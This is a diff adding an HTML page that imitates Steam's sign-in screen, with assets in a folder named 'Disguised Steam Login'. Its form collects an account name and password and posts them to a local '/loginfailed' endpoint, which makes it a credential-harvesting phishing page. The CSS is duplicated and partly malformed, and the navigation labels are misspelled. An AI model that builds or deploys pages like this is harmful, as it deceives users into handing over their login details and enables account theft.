@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+<html lang="en-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <title>Login</title>
+    <style>
+        body {
+            background: url('Disguised Steam Login_files/Background.jpg') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .top-container {
+            background-color: #171d25;
+            width: 100%;
+            height: 60px;
+            top: 0;
+            left: 0;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+        }
+        .top-container img {
+            left: 300px; 
+            height: 80px;
+            margin-right: 20px;
+        }
+        .top-container .store-text {
+            color: #1a9fff;
+            font-size: 24px;
+        }
+        .bottom-container {
+            background-color: #181a21;
+            width: 100%;
+            height: 20%;
+            position: absolute;
+            bottom: -50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 20px;
+            box-sizing: border-box;
+        }
+        .bottom-container .bottom-text {
+            color: #b8b6b4;
+            font-size: 14px;
+            justify-content: center;
+            position: relative;
+            text-align: center;
+        }
+        .login-container {
+            background-color: rgba(24, 26, 33, 1);
+            padding: 30px;
+            border-radius: 15px;
+            color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            position: relative;
+            width: 570px;
+        }
+        .login-container label,
+        .login-container input {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 12px;
+        }
+        .login-container label[for="account"] {
+            color: #1999ff;
+        }
+        .login-container label[for="password"] {
+            color: #afafaf;
+        }
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: calc(100% - 30px);
+            padding: 9.75px;
+            border: 1px solid #32353c;
+            border-radius: 2.5px;
+            margin-bottom: 20px;
+            background-color: #32353c;
+            color: white;
+            height: calc(1.75 * 7.5px);
+        }
+        .login-container input[type="text"]:focus,
+        .login-container input[type="password"]:focus {
+            border: 1px solid #32353c;
+        }
+        .login-container input[type="submit"] {
+            background: linear-gradient(to right, #07beff, #2d75ff);
+            color: white;
+            border: none;
+            padding: 15px 105px;
+            cursor: pointer;
+            display: block;
+            margin: 0 auto;
+            font-size: 13.5px;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
+        .login-container input[type="submit"]:hover {
+            background-color: #005FB3;
+        }
+        .login-title {
+            position: absolute;
+            top: -60px;
+            left: -1px; 
+            font-size: 26px;
+            font-weight: bold;
+            color: white;
+            padding: 0 10px;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .remember-me input[type="checkbox"] {
+            width: 15px;
+            height: 15px;
+            margin-right: 7.5px;
+            background-color: #32353c;
+            border: 1px solid #32353c;
+            border-radius: 1.5px;
+            appearance: none;
+            cursor: pointer;
+            position: relative;
+            top: -1px;
+        }
+        .remember-me input[type="checkbox"]:checked {
+            background-color: #32353c;
+            color: white;
+        }
+        .remember-me input[type="checkbox"]:checked::before {
+            content: '✔';
+            display: block;
+            text-align: center;
+            color: white;
+            position: relative;
+            top: -1px;
+        }
+        .remember-me label {
+            color: #afafaf;
+            font-size: 12px;
+        }
+        .help-link {
+            text-align: center;
+            color: #afafaf;
+            font-size: 12px;
+            text-decoration: underline;
+            margin-top: 10px;
+        }
+        body {
+            background: url('Disguised Steam Login_files/Background.jpg') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .top-container {
+            background-color: #171d25;
+            width: 100%;
+            height: 100px;
+            position: absolute;
+            top: 0;
+            left: 0;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+        }
+        .top-container img {
+            height: 50px;
+            margin-right: 20px;
+        }
+        .top-container .store-text {
+            color: #1a9fff;
+            font-size: 17px;
+            margin-right: 20px;
+            text-decoration: underline;
+        }
+        .top-container .community-text{
+            color: #dcdedf;
+            font-size: 17px;
+            margin-right: 20px;
+        }
+        .top-container .about-text{
+            color: #dcdedf;
+            font-size: 17px;
+            margin-right: 20px;
+        }
+        .top-container img {
+            height: 50px;
+            margin-right: 20px;
+            transform: translateX(450px);
+        }
+        .top-container .store-text {
+            color: #1a9fff;
+            font-size: 17px;
+            margin-right: 20px;
+            text-decoration: underline;
+            transform: translateX(450px);
+        }
+        .top-container .community-text {
+            color: #dcdedf;
+            font-size: 17px;
+            margin-right: 20px;
+            transform: translateX(450px);
+        }
+        .top-container .about-text {
+            color: #dcdedf;
+            font-size: 17px;
+            margin-right: 20px;
+            transform: translateX(450px);
+        }
+        .top-container .support-text {
+            color: #dcdedf;
+            font-size: 17px;
+            margin-right: 20px;
+            transform: translateX(450px);
+        }
+            color: #dcdedf;
+            font-size: 17px;
+            margin-right: 20px;
+        }
+        .login-container {
+            background-color: rgba(24, 26, 33, 1);
+            padding: 30px;
+            border-radius: 15px;
+            color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            position: relative;
+            width: 570px;
+        }
+        .login-container label,
+        .login-container input {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 12px;
+        }
+        .login-container label[for="account"] {
+            color: #1999ff;
+        }
+        .login-container label[for="password"] {
+            color: #afafaf;
+        }
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: calc(100% - 30px);
+            padding: 9.75px;
+            border: 1px solid #32353c;
+            border-radius: 2.5px;
+            margin-bottom: 20px;
+            background-color: #32353c;
+            color: white;
+            height: calc(1.75 * 7.5px);
+        }
+        .login-container input[type="text"]:focus,
+        .login-container input[type="password"]:focus {
+            border: 1px solid #32353c;
+        }
+        .login-container input[type="submit"] {
+            background: linear-gradient(to right, #07beff, #2d75ff);
+            color: white;
+            border: none;
+            padding: 15px 105px;
+            cursor: pointer;
+            display: block;
+            margin: 0 auto;
+            font-size: 13.5px;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
+        .login-container input[type="submit"]:hover {
+            background-color: #005FB3;
+        }
+        .login-title {
+            position: absolute;
+            top: -60px;
+            left: -1px; 
+            font-size: 26px;
+            font-weight: bold;
+            color: white;
+            padding: 0 10px;
+            border-radius: 5px;
+        }
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .remember-me input[type="checkbox"] {
+            width: 15px;
+            height: 15px;
+            margin-right: 7.5px;
+            background-color: #32353c;
+            border: 1px solid #32353c;
+            border-radius: 1.5px;
+            appearance: none;
+            cursor: pointer;
+            position: relative;
+            top: -1px;
+        }
+        .remember-me input[type="checkbox"]:checked {
+            background-color: #32353c;
+            color: white;
+        }
+        .remember-me input[type="checkbox"]:checked::before {
+            content: '✔';
+            display: block;
+            text-align: center;
+            color: white;
+            position: relative;
+            top: -1px;
+        }
+        .remember-me label {
+            color: #afafaf;
+            font-size: 12px;
+        }
+        .help-link {
+            text-align: center;
+            color: #afafaf;
+            font-size: 12px;
+            text-decoration: underline;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="top-container">
+        <img src="./Disguised Steam Login (English)_files/Head Logo.png" alt="Logo">
+        <div class="store-text">SOTRE</div>
+        <div class="community-text">COUMUNITY</div>
+        <div class="about-text">ABOUT</div>
+        <div class="support-text">SUPPORT</div>
+    </div>
+    <div class="login-container">
+        <div class="login-title">Sign in</div>
+        <form action="/loginfailed" method="post">
+            <label for="account">SIGN IN WITH ACCOUNT NAME</label>
+            <input type="text" id="account" name="account">
+            <label for="password">PASSWORD</label>
+            <input type="password" id="password" name="password">
+            <div class="remember-me">
+                <input type="checkbox" id="remember" name="remember" checked="">
+                <label for="remember">Remember me</label>
+            </div>
+            <input type="submit" value="Sign in">
+        </form>
+        <div class="help-link">Help, I can't sign in</div>
+    </div>
+    <div class="bottom-container">
+        <div class="bottom-text">New to Steam?<br>It's free and easy. Discover thousands of<br>games to play with millions of new friends.<br>Learn more about Steam</div>
+    </div>
+</body>
+</html>
